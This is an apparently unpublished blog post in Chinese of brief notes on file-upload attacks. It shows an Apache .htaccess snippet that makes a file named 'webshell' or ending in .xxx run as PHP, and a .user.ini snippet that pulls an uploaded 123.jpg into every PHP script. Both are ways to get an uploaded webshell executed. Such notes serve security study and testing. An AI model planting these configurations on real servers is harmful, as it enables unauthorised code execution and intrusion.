---
layout: post
title: File-Upload
subtitle: File-Upload
date: 2025-06-17 16:22
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
published: false
---

apache配置文件 `.htaccess`

```
<FilesMatch "webshell">
Sethandler application/x-httpd-php
</FilesMatch>
# or
AddHandler application/x-httpd-php .xxx
```

php配置文件 `.user.ini`

```ini
auto_prepend_file = 123.jpg
auto_append_file = 123.jpg
```

*必须运行在fastcgi模式*